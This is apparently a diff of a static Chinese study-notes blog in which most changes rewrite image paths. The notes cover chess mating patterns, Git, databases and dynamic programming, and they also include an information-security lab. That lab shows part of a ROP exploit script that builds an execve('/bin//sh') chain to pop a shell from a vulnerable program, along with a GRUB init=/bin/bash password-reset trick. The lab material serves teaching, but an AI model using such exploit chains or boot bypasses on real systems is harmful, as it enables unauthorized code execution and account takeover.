class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080defc9</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cb25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="built_in">print</span> p</span><br></pre></td></tr></table></figure></li>
 <li><p>使用命令<code>python exploit.py &gt; badfile</code>完成恶意输入文件的构建，使用命令<code>./stack</code>运行我们的漏洞程序，可以看到攻击成功，新开了一个shell输入端。</p>
-<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop5.png"></p>
+<p><img src="/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop5.png"></p>
 </li>
 </ol>
 <blockquote>
@@ -588,8 +757,8 @@
 <li><p>首先重启虚拟机，出现GNU GRUB引导菜单时，按下方向键选择恢复模式（recovery mode），按e进入编辑模式（或者直接选择advanced条目直接按e不按enter）</p>
 </li>
 <li><p>进入编辑模式后，将linux行的ro修改为rw，删除后面的quiet spash，添加init=/bin/bash，如图</p>
-<p><img src="/project/linux%5Ckali%E9%87%8D%E8%AE%BE1.png"></p>
-<p><img src="/project/linux%5Ckali%E9%87%8D%E8%AE%BE2.png"></p>
+<p><img src="/linux%5Ckali%E9%87%8D%E8%AE%BE1.png"></p>
+<p><img src="/linux%5Ckali%E9%87%8D%E8%AE%BE2.png"></p>
 </li>
 <li><p>修改完成按ctrl+x继续启动</p>
 </li>
@@ -752,43 +921,43 @@
 <blockquote>
 <p> 注意保证车不要被将吃</p>
 </blockquote>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8F%8C%E8%BD%A6%E9%94%99.png" alt="双车错"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8F%8C%E8%BD%A6%E9%94%99.png" alt="双车错"></p>
 <h3 id="重炮杀"><a href="#重炮杀" class="headerlink" title="重炮杀"></a>重炮杀</h3><p>条件1：两个炮在一条直线上将军，炮和将之间无子阻隔（这样就没办法通过垫子解决）</p>
 <p>条件2：将无法左右移动（有子拦住或者该处正被将军，比如被马踩着）</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%87%8D%E7%82%AE%E6%9D%80.png" alt="重炮杀"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%87%8D%E7%82%AE%E6%9D%80.png" alt="重炮杀"></p>
 <h3 id="马后炮"><a href="#马后炮" class="headerlink" title="马后炮"></a>马后炮</h3><p>条件1：马和对方将在同一条线上且中间空一格（不能隔子）</p>
 <p>条件2：炮在马后且可以打到将（炮马之间无子）</p>
 <p>这样马控制将不能往两边走，炮控制将不能前进或后退</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%A9%AC%E5%90%8E%E7%82%AE.png" alt="马后炮"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%A9%AC%E5%90%8E%E7%82%AE.png" alt="马后炮"></p>
 <h3 id="天地炮"><a href="#天地炮" class="headerlink" title="天地炮"></a>天地炮</h3><p>一炮在中路，和对方的将中间隔着士和象，此时该炮压制住了士象，使之无法离开；另一炮在底线形成将军<strong>或者</strong>压制另一对士象借助车马兵将军，其中一炮压制士象，采用其他方式将军也称铁门栓（具体见基础杀法）</p>
 <p>例1：一炮压制士象，另一炮底线将军。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE1.png" alt="天地炮"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE1.png" alt="天地炮"></p>
 <p>例2：车可以吃掉炮线上的士而此时将不能吃车（否则被炮将军），将又被车将军且无法移动。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE2.png" alt="天地炮"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%A4%A9%E5%9C%B0%E7%82%AE2.png" alt="天地炮"></p>
 <h2 id="基础杀法"><a href="#基础杀法" class="headerlink" title="基础杀法"></a>基础杀法</h2><h3 id="卧槽马"><a href="#卧槽马" class="headerlink" title="卧槽马"></a>卧槽马</h3><p>槽点即九宫格中心点左边（右边）两格的位置，当马跳到此处时，可以踩将。</p>
 <p>此时解法仅有：1.杀马 2.蹩马腿 3.移动将</p>
 <p>当解法均不可满足时形成绝杀。由于士象没有办法蹩卧槽马的腿和杀马，故在没有防备时仅能移动将，配合其他子可杀。</p>
 <p>例1：当卧槽后将移动到九宫格中心，形成了马后炮的马部分，就可配合马后炮杀将。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8D%A7%E6%A7%BD%E9%A9%AC.png" alt="卧槽马"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E5%8D%A7%E6%A7%BD%E9%A9%AC.png" alt="卧槽马"></p>
 <h3 id="挂角马"><a href="#挂角马" class="headerlink" title="挂角马"></a>挂角马</h3><p>即马走到士角的位置，即将踩将。</p>
 <p>和卧槽马一样，此时解法仅有：1.杀马 2.蹩马腿 3.移动将。</p>
 <p>而挂角马多一种被士杀的危险，当士不在中间或者士被炮控制住无法移动时就可以使用。</p>
 <p>例1：和卧槽马一样，挂角马也可以控制两个点，是将点和将点的对格点。可以用挂角马把将逼离将点之后，用其他子将军，用对格点保护其他子。（对格点可以被象蹩腿）</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E6%8C%82%E8%A7%92%E9%A9%AC.png" alt="挂角马"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E6%8C%82%E8%A7%92%E9%A9%AC.png" alt="挂角马"></p>
 <h3 id="闷杀"><a href="#闷杀" class="headerlink" title="闷杀"></a>闷杀</h3><p>对方将被自己的其他子堵住时进兵绝杀。</p>
 <p>例1：炮打闭功，炮在底线将军，此时若没法<strong>填子</strong>也没法<strong>挪开炮架子</strong>也没法<strong>上移将</strong>，则是闭功</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%801.png" alt="闷杀"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%801.png" alt="闷杀"></p>
 <p>例2：当对方的子挡住将中路时，车杀其另一条路即可，此时效果类似于双车错。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%802.png" alt="闷杀"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%802.png" alt="闷杀"></p>
 <p>例3：如下图，首先不能在肋线（4、6路）上将军，下有车可以吃子，对方车和将一个吃兵一个吃车就没有杀招了；其次不能在将点将军（即进车吃黑车），这样会被将吃；那么只能下兵，且要先把将堵在此时位置，即需要另一个子填住象眼处，既能防止飞象吃兵也能进行闷杀。故红车左移将军，黑车势必下来吃红车，进兵将军形成闷杀。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%803.png" alt="闷杀"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%803.png" alt="闷杀"></p>
 <p>例4：如下图，跳马可用炮将军，但对方炮可以上移动，故先用马跳到炮上堵住炮，即形成闷杀。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%804.png" alt="闷杀"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%97%B7%E6%9D%804.png" alt="闷杀"></p>
 <h3 id="铁门栓"><a href="#铁门栓" class="headerlink" title="铁门栓"></a>铁门栓</h3><p>铁门栓指中路士象被炮控制，从而士点象点安全可以用来将军。</p>
 <p>例1： 如图，可以分析不能在底线将军，则花费左车吃中士，此时角士只能下来，从而让出将路，进车配合红帅杀将。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%931.png" alt="铁门栓"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%931.png" alt="铁门栓"></p>
 <p>例2：如图，我们通常采用马或者帅<strong>照着对方士点</strong>，配合车或者兵在被照着的士点上杀将。</p>
-<p><img src="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%932.png" alt="铁门栓"></p>
+<p><img src="/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/%E9%93%81%E9%97%A8%E6%A0%932.png" alt="铁门栓"></p>
 <h3 id="大刀剜心"><a href="#大刀剜心" class="headerlink" title="大刀剜心"></a>大刀剜心</h3><p>车或兵配合其他的子吃掉花心士形成绝杀。</p>
 <p>条件1：保证车不被吃掉，如无法上士（另一车在底线将军<strong>或</strong>炮控制着底线士象）,将无法上来吃掉车（炮在中路照着或者有马照车等等）</p>
 <p>条件2：将无法左右移动（有我方帅照着，或马照着，或将左右路被他自己的子挡住等）</p>
@@ -971,7 +1140,7 @@
 <p><strong>暂存区(stage/index)：</strong>是进行操作时暂时存放文件的地方。他一般存放于==.git/index==中。其中.git是本地项目中的一个隐藏文件，他虽然在项目目录中但却不属于工作区。</p>
 <p><strong>版本库：</strong>即==.git==目录</p>
 <p>他们之间的关系如图所示：</p>
-<p><img src="/project/2021/01/26/Git/%E5%9B%BE1.png"></p>
+<p><img src="/2021/01/26/Git/%E5%9B%BE1.png"></p>
 <p>其中objects是git的对象库，位于==.git/objects==目录下。</p>
 <p>master分支即当前分支，也就是本地仓库，push到远程就是push的head指向的分支。</p>
 <h2 id="Git创建仓库"><a href="#Git创建仓库" class="headerlink" title="Git创建仓库"></a>Git创建仓库</h2><p><strong>git init：</strong>使当前执行目录成为一个git仓库，会生成.git目录，一般是隐藏的</p>
@@ -989,8 +1158,8 @@
 <p><strong>git config -e：</strong>修改配置文件（针对当前仓库）</p>
 <p><strong>git config -e –global：</strong>修改配置文件（针对系统上所有仓库）</p>
 <p><strong>git config –global user.name “xxx”：</strong>设置用户名（若去掉global只对当前仓库有效）</p>
-<p><strong>git config –global user.email <a href="mailto:&#120;&#x78;&#x78;&#x78;&#x78;&#x40;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;">&#120;&#x78;&#x78;&#x78;&#x78;&#x40;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;</a>：</strong>设置用户邮箱信息（若去掉global只对当前仓库有效）</p>
-<h2 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h2><p><img src="/project/2021/01/26/Git/%E5%9B%BE2.png"></p>
+<p><strong>git config –global user.email <a href="mailto:&#120;&#120;&#x78;&#x78;&#x78;&#x40;&#120;&#120;&#x2e;&#x63;&#111;&#109;">&#120;&#120;&#x78;&#x78;&#x78;&#x40;&#120;&#120;&#x2e;&#x63;&#111;&#109;</a>：</strong>设置用户邮箱信息（若去掉global只对当前仓库有效）</p>
+<h2 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h2><p><img src="/2021/01/26/Git/%E5%9B%BE2.png"></p>
 <p>有了==.git==之后就可以执行这些操作了</p>
 <p><strong>git clone usr/ssh [newname]：</strong>将远程仓库拷贝到本地，不指定新名字则按照url中最后一个目录名</p>
 <p><strong>git clone -b branch1 <a target="_blank" rel="noopener" href="http://www.github/sdfd.git%EF%BC%9A">www.github/sdfd.git：</a></strong>将远程仓库的分支branch1拷贝到本地</p>
@@ -1019,11 +1188,11 @@
 <blockquote>
 <p>Github目前的主分支名不再是master而是main</p>
 <p>所以可能有如下报错，将master改成main即可</p>
-<p><img src="/project/2021/01/26/Git/%E5%9B%BE3.png"></p>
+<p><img src="/2021/01/26/Git/%E5%9B%BE3.png"></p>
 </blockquote>
 <h2 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h2><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
 <li><p>今天git clone的时候报错无法连接远程仓库，查找资料后解决办法为输入<code>ssh-agent bash</code>命令开启ssh代理。</p>
-<p><img src="/project/2021/01/26/Git/%E5%9B%BE4.png"></p>
+<p><img src="/2021/01/26/Git/%E5%9B%BE4.png"></p>
 </li>
 <li><p>git clone一个新的仓库无需git init，这样会导致外面文件夹有.git里面项目文件夹也有.git。git clone的时候会自动在项目文件夹里面创建.git</p>
 </li>
@@ -1133,7 +1302,7 @@
 <p><u>优点</u>：简化了应用程序的编制，减少了应用程序的维护和修改</p>
 <p><strong>数据库系统的构成：</strong></p>
 <p>数据库、数据库管理系统（及其应用开发工具）、应用数据、数据库管理员</p>
-<p><img src="/project/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F.png" alt="数据库系统"></p>
+<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F.png" alt="数据库系统"></p>
 <p><strong>数据库系统的特点：</strong></p>
 <ol>
 <li>数据结构化——数据用数据模型描述</li>
@@ -1420,7 +1589,7 @@
 <p>$ X\stackrel{P}{\longrightarrow} Y$ : Y对X部分函数依赖（X能决定Y，但不是完全函数依赖）</p>
 <p>$ X\stackrel{传递}{\longrightarrow} Z$ ：Z对X传递函数依赖：X决定Y（非平凡）且Y不能决定X，Y决定Z（非平凡）</p>
 <p><strong>范式：</strong></p>
-<p><img src="/project/1606916927528.png" alt="1606916927528"></p>
+<p><img src="/1606916927528.png" alt="1606916927528"></p>
 <ol>
 <li><p>1NF——每个属性不可再分（规范化关系）</p>
 <p>问题：数据冗余、插入异常、删除异常、更新复杂</p>
@@ -1747,7 +1916,7 @@
 <blockquote>
 <p>一个问题必须有这两个特点，才能用动态规划去解决。动态规划通过记录重叠子问题的解（递推或者记忆化搜索）来解决问题。</p>
 </blockquote>
-<h4 id="1-数塔问题（二维）"><a href="#1-数塔问题（二维）" class="headerlink" title="1.数塔问题（二维）"></a>1.数塔问题（二维）</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/number_tower.png" alt="number_tower"></p>
+<h4 id="1-数塔问题（二维）"><a href="#1-数塔问题（二维）" class="headerlink" title="1.数塔问题（二维）"></a>1.数塔问题（二维）</h4><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/number_tower.png" alt="number_tower"></p>
 <p><strong>解法：</strong>用 $f[i][j]$ 存数塔中的数，$dp[i][j]$表示数塔（i，j）处数之前可取的最大路径值，可写出状态转移方程：$dp[i][j] = max(dp[i+1][j], dp[i+1][j+1]) + f[i][j]$</p>
 <p><strong>代码：</strong></p>
 <p>递归写法（含有许多重复计算）</p>
@@ -1759,13 +1928,13 @@
 <p>递推写法</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn], dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//输入</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//边界</span></span><br><span class="line">		dp[n][i] = f[n][i];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)<span class="comment">//求出每个dp[i][j]</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j + <span class="number">1</span>]) + f[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-最大连续子序列和"><a href="#2-最大连续子序列和" class="headerlink" title="2. 最大连续子序列和"></a>2. 最大连续子序列和</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD%E5%AD%90%E5%BA%8F%E5%88%97.png" alt="最大连续子序列"></p>
+<h4 id="2-最大连续子序列和"><a href="#2-最大连续子序列和" class="headerlink" title="2. 最大连续子序列和"></a>2. 最大连续子序列和</h4><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD%E5%AD%90%E5%BA%8F%E5%88%97.png" alt="最大连续子序列"></p>
 <p><strong>解法：</strong>令dp[i]表示以A[i]结尾的最大连续序列和，那么整个序列的最大和即为dp[1]—dp[n]中最大值.接下来可以求得dp[i]状态转移方程$dp[i] = max(A[i],A[i]+dp[i-1] )$。边界条件即dp[0] = A[0].</p>
 <p>对于上例13来说，以它为结尾的最大序列和要么是13+以-4结尾的最大序列和，要么是13本身（加上-4部分反而会更小）。</p>
 <p><strong>代码：</strong></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	dp[<span class="number">1</span>] = A[<span class="number">1</span>];<span class="comment">//边界</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">		dp[i] = <span class="built_in">max</span>(A[i], A[i] + dp[i - <span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="keyword">if</span> (dp[i] &gt; max)</span><br><span class="line">			max = dp[i];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, max);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-最长不降子序列-LIS"><a href="#3-最长不降子序列-LIS" class="headerlink" title="3. 最长不降子序列(LIS)"></a>3. 最长不降子序列(LIS)</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS.jpg" alt="LIS"></p>
+<h4 id="3-最长不降子序列-LIS"><a href="#3-最长不降子序列-LIS" class="headerlink" title="3. 最长不降子序列(LIS)"></a>3. 最长不降子序列(LIS)</h4><p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS.jpg" alt="LIS"></p>
 <p><strong>解法一:</strong></p>
 <p>dp[i]记录以A[i]结尾的LIS长度，则整个序列的LIS长度为dp[1]—dp[n]中最大值。其中dp[i]的取值要么为dp[j]+1(此时A[i]可以接在以A[j]结尾的LIS之后)，要么为1（此时A[i]值非常小，没有办法接在任何子链后面）。由此可写出状态转移方程：$dp[i] = max(1,dp[j]+1) (j = 1,2,…,i-1 且 A[j] &lt;= A[i])$.其中dp[j]+1中的j表示满足A[j] &lt;= A[i]的j.当A[i]是当前最小值时，dp[j]+1并不存在，此时dp[i]为1.此解法复杂度为$O(n^2)$.</p>
 <p><strong>代码：</strong></p>
@@ -1775,7 +1944,7 @@
 <p>在解法一中，每次计算dp[i]都要将所有A[i]前面的A[j]同A[i]比较一遍，也因此占用了n的复杂度，解法二是对比较过程的优化。</p>
 <p>设置一个数组d，其中d[i]表示长度为i的LIS最小尾元素的值，len表示d数组中元素个数。如下图所示，len的长度就是我们需要的最终结果（即6），在维护d[len]的过程中，首先遍历序列，若遇到比当前len所存的d[len]值更大的数，则放在d[++len]处（如9后面的16）；若遇到比当前len所存的d[len]小的数，则去替换前面第一个比自己大的数（如18原来在37的后面，在d数组中替换了前面的24）。</p>
 <p>需要注意的是，d[len]所存结果并不是最终的LIS序列，但其len值是最大的LIS长度，并且每一个d[len]的值（如37）都一定是可达的（即有以它为结尾的LIS），只不过可达的路径中有的值可能被替换掉了。</p>
-<p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS%E4%BC%98%E5%8C%96.jpg" alt="LIS优化"></p>
+<p><img src="/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS%E4%BC%98%E5%8C%96.jpg" alt="LIS优化"></p>
 <p>在此解法中，遍历耗时n，查找替换值可采用二分查找法，耗时logn，总的复杂度为<strong>O(nlogn)</strong>.</p>
 <p><strong>代码：</strong></p>
